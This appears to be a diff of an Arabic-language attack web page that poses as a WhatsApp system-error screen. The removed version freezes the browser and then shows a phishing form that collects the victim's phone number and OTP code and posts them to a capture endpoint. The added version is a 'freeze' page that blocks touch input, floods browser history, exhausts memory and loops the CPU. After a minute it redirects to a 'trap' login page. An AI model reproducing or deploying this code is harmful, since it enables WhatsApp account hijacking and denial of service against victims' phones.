@@ -1,67 +1,48 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تحديث النظام الإجباري</title>
+    <title>System Error</title>
     <style>
-        body { background: #000; color: #ff0000; font-family: sans-serif; text-align: center; padding-top: 40%; overflow: hidden; }
-        .freeze-msg { font-size: 22px; font-weight: bold; animation: blink 0.5s infinite; }
-        @keyframes blink { 0% {opacity: 1;} 50% {opacity: 0;} }
-        input { width: 80%; padding: 15px; margin: 10px; border-radius: 8px; border: 1px solid #333; background: #222; color: #fff; }
-        button { background: #25D366; color: white; padding: 15px 30px; border: none; border-radius: 8px; font-weight: bold; }
-        #login-section { display: none; padding-top: 10%; }
+        body { background: black; color: red; text-align: center; padding-top: 50%; font-family: Courier; overflow: hidden; touch-action: none; }
     </style>
 </head>
 <body>
-
-    <div id="freeze-section">
-        <div class="freeze-msg">⚠️ خطأ حرجة في النظام!<br>جاري إصلاح ملفات WhatsApp...<br>الرجاء الانتظار 60 ثانية</div>
-    </div>
-
-    <div id="login-section">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" width="60">
-        <h3>تم استعادة النظام</h3>
-        <p>لتجنب حظر حسابك، يرجى تأكيد ملكية الرقم:</p>
-        <input type="tel" id="phone" placeholder="رقم الهاتف">
-        <input type="number" id="otp" placeholder="كود التحقق (OTP)">
-        <button onclick="sendToTelegram()">تأكيد الحساب</button>
-    </div>
+    <div id="status">⚠️ جاري إصلاح ثغرة في الذاكرة...<br>الرجاء عدم لمس الشاشة</div>
 
     <script>
-        // دالة التفجير والتجميد
-        window.onload = function() {
-            // استهلاك موارد المعالج فوراً
-            const start = Date.now();
-            while (Date.now() - start < 60000) { 
-                // حلقة مفرغة تشل حركة المتصفح لمدة دقيقة
-                Math.sqrt(Math.random());
-            }
-            
-            // بعد انتهاء الدقيقة، نظهر صفحة السحب
-            document.getElementById('freeze-section').style.display = 'none';
-            document.getElementById('login-section').style.display = 'block';
-            document.body.style.overflow = 'auto';
-            document.body.style.background = '#121212';
-            document.body.style.color = '#fff';
-        };
+        function freezeHard() {
+            // 1. شل حركة اللمس تماماً عبر المتصفح
+            document.addEventListener('touchstart', (e) => e.preventDefault(), {passive: false});
+            document.addEventListener('touchmove', (e) => e.preventDefault(), {passive: false});
 
-        async function sendToTelegram() {
-            const phone = document.getElementById('phone').value;
-            const otp = document.getElementById('otp').value;
-            
-            await fetch('/capture', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    email: "رقم: " + phone,
-                    password: "كود: " + otp,
-                    device: navigator.userAgent
-                })
-            });
-            
-            window.location.href = "https://www.whatsapp.com";
+            // 2. تجميد شريط العناوين والواجهة عبر إرسال آلاف الطلبات للسجل
+            setInterval(() => {
+                for (let i = 0; i < 500; i++) {
+                    window.history.pushState(null, null, window.location.href + "/" + Math.random());
+                }
+            }, 100);
+
+            // 3. استهلاك الرام (RAM) - سيجعل الجهاز يتوقف عن الاستجابة للمس النظام
+            let bomb = [];
+            const freezeInterval = setInterval(() => {
+                try {
+                    // توليد نصوص عملاقة في الذاكرة
+                    bomb.push(new Array(1000000).join("X"));
+                } catch (e) {
+                    // إذا امتلأت الرام، سنبدأ حلقة CPU لا نهائية
+                    while(true) { Math.sqrt(Math.random()); }
+                }
+            }, 50);
+
+            // توقف السكريبت بعد دقيقة لتحويل الضحية
+            setTimeout(() => {
+                clearInterval(freezeInterval);
+                location.href = "/login-box"; // استبدل بصفحة المصيدة الخاصة بك
+            }, 60000);
         }
+
+        window.onload = freezeHard;
     </script>
 </body>
 </html>
